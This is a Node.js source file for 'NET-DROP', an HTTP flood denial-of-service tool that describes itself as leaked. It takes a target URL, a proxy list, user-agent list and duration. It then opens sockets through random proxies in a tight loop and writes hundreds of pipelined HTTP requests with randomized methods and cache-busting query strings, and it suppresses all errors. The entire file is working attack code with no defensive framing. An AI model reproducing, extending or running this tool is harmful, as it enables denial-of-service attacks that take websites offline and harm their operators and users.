const fs = require('fs');
const url = require('url');
var http = require('http');
const request = require('request');
const net = require('net');
const CloudScraper = require('cloudscraper');
const path = require('path');

const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
process.setMaxListeners(0);
EventEmitter.defaultMaxListeners = Infinity;
EventEmitter.prototype._maxListeners = Infinity;

if (process.argv.length <= 5) { 
	console.log("[+] Usage: node NET-DROP.js <IP> <PORT> <PROXY> <USERAGENT> <TIME> RANDOM>");
	console.log("[+] NET-DROP leaked by P6");
	process.exit(-1);
}
var target = process.argv[2];
var randomTargetQuery;
var protocol = process.argv[6];
const proxies = fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
const userAgents = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n');
var theproxy = 0;
var parsed = url.parse(target);
var proxy = proxies[theproxy];
process.on('uncaughtException', function(e) {
	// x)
});

process.on('unhandledRejection', function(e) {
	// x)
});
console.log('[+] Attack starting on: ' + target);

const Methods = [
	"GET",
	"POST",
	"HEAD",
	"DELETE",
	"PUT"
];

setTimeout(() => {
    process.exit(1);
}, process.argv[5] * 1000);

setInterval(function() {
    var nemo = new net.Socket();
    //nemo.setTimeout(10000);
    //theproxy++;
    //if (theproxy == proxies.length - 1) {
    //    theproxy = 0;
    //}
    //proxy = proxies[theproxy];
    //if (proxy && proxy.length > 5) {
    //    proxy = proxy.split(':');
    //} else {
    //    return false;
    //}

    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(":");
    var userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    if(protocol != "RANDOM")
    {
        nemo.connect(proxy[1], proxy[0], function() {
            for (var i = 0; i < 100; i++) {
                nemo.write(protocol + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(protocol + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(protocol + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(protocol + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(protocol + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(protocol + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(protocol + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    			console.log('[+] Attack sent to ' + target + ' (' + protocol + '): ' + proxy[0] + ':' + proxy[1] /*+ ' - ' + ipLocation*/);
    		}
        });
    }
    else
    {
        nemo.connect(proxy[1], proxy[0], function() {
            for (var i = 0; i < 10; i++) {
                const randomMethods = Methods[Math.floor(Math.random() * Methods.length)];
                randomTargetQuery = target + "?" + randomString(16) + "=" + randomString(8) + "&" + randomString(5) + "=" + randomString(3) + "&" + randomString(19) + "=" + randomString(7);
                nemo.write(randomMethods + ' ' + randomTargetQuery + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(randomMethods + ' ' + randomTargetQuery + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(randomMethods + ' ' + randomTargetQuery + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(randomMethods + ' ' + randomTargetQuery + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(randomMethods + ' ' + randomTargetQuery + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(randomMethods + ' ' + randomTargetQuery + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
                nemo.write(randomMethods + ' ' + randomTargetQuery + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
    			console.log('[+] Attack sent to ' + randomTargetQuery + ' (' + randomMethods + '): ' + proxy[0] + ':' + proxy[1] /*+ ' - ' + ipLocation*/);
    		}
        });
    }
    nemo.on('data', function () { setTimeout(function () { nemo.destroy(); return delete nemo; }, 10000); });

}, 0);

function randomString(length) {
    var result           = '';
    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
       result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
 }